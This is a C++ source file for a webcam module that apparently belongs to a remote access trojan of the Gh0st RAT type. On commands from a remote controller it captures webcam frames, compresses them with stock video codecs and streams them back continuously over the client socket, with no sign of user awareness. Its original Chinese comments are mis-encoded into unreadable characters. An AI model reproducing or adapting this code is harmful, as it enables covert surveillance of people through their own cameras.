// MyVideoManager.cpp: implementation of the CMyVideoManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "MyVideoManager.h"
#include "until.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyVideoManager::CMyVideoManager(CClientSocket *pClient) : CManager(pClient)
{
	m_pMyVideoCap = NULL;
	m_pVideoCodec = NULL;
	m_bIsWorking = true;
	m_bIsCompress = true;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	m_fccHandler = 0;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CMyVideoManager::~CMyVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CMyVideoManager::Destroy()
{
	if (m_pMyVideoCap)
	{
		delete m_pMyVideoCap;
		m_pMyVideoCap = NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}

void CMyVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // Ҫ������ѹ��
		{
			// �����������ʼ��������������ѹ������
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, false);
		break;
	case COMMAND_WEBCAM_RESIZE:
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CMyVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	memcpy(lpBuffer + 1, m_pMyVideoCap->m_lpbmi, sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);

	delete [] lpBuffer;		
}

void CMyVideoManager::sendNextScreen()
{
	LPVOID	lpDIB = m_pMyVideoCap->GetDIB();
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + m_pMyVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)
	{
		int	nCompressLen = 0;
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_pMyVideoCap->m_lpbmi->bmiHeader.biSizeImage, lpBuffer + nHeadLen, &nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		memcpy(lpBuffer + nHeadLen, lpDIB, m_pMyVideoCap->m_lpbmi->bmiHeader.biSizeImage);
		nPacketLen = m_pMyVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}

	Send(lpBuffer, nPacketLen);

	delete [] lpBuffer;
}

void CMyVideoManager::ResetScreen(int nWidth, int nHeight)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);

	// ������Ƶ��С
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	InterlockedExchange((LPLONG)&m_bIsWorking, true);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}


bool CMyVideoManager::Initialize()
{
	bool	bRet = false;
	// ����ʹ����
	if (!CMyVideoCap::IsWebCam())
		return false;

	m_pMyVideoCap = new CMyVideoCap;

	// ָ���˹̶���С
	if (m_nVedioWidth && m_nVedioHeight)
	{
		bRet = m_pMyVideoCap->Initialize(m_nVedioWidth, m_nVedioHeight);
	}
	else
	{
		// ����H263������֧�ֵ����ִ�С,���ȿ���
		bRet = m_pMyVideoCap->Initialize(352, 288);
		if (!bRet)
			bRet = m_pMyVideoCap->Initialize(176, 144);

		// ����ϵͳĬ�ϵ�
		if (!bRet)
			bRet = m_pMyVideoCap->Initialize();

	}

	// ��Ҫ��ѹ������CMyVideoCap��ʼ��ʧ��
	if (!bRet)
		return bRet;

	// ���⼸�ֽ������ѡһ��
	DWORD	fccHandlerArray[] = 
	{
		859189837,	// Microsoft H.263 Video Codec
		842225225,	// Intel Indeo(R) Video R3.2
		842289229,	// Microsoft MPEG-4 Video Codec V2
		1684633187	// Cinepak Codec by Radius
	};

	for (int i = 0; i < sizeof(fccHandlerArray) / sizeof(fccHandlerArray[0]); i++)
	{
		m_pVideoCodec = new CVideoCodec;
		if (!m_pVideoCodec->InitCompressor(m_pMyVideoCap->m_lpbmi, fccHandlerArray[i]))
		{
			delete m_pVideoCodec;
			// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
			m_pVideoCodec = NULL;
		}
		else
		{
			m_fccHandler = fccHandlerArray[i];
			break;
		}
	}
	return bRet;
}

DWORD WINAPI CMyVideoManager::WorkThread( LPVOID lparam )
{
	static DWORD dwLastScreen = GetTickCount();

	CMyVideoManager *pThis = (CMyVideoManager *)lparam;
	
	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
	}
	pThis->sendBITMAPINFO();
	// �ȿ��ƶ˶Ի����
	pThis->WaitForDialogOpen();

	while (pThis->m_bIsWorking)
	{
		// �����ٶ�
		if ((GetTickCount() - dwLastScreen) < 150)
			Sleep(100);
		dwLastScreen = GetTickCount();
		pThis->sendNextScreen();
	}
	// �����Ѿ�����ʵ�����������µ���
	pThis->Destroy();

	return 0;
}
